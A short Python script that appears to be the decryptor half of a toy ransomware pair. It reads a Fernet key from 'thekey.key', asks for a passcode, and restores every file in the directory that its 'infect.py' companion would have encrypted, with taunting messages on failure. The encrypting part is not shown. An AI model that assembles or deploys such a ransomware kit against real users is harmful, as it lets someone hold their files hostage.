import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "infect.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as lolkey:
    secretkey = lolkey.read()


passcode = "Your passcode goes here:)"

verify_pls = input("Enter the passcode to decrypt ur files: ")

if verify_pls == passcode:
    for file in files :
        with open(file, "rb") as thefile:
            contents = thefile.read()
        
        decrypted_lol = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(decrypted_lol)
        print("ur files are back to normal now:)")

else:
    print("lol nope")
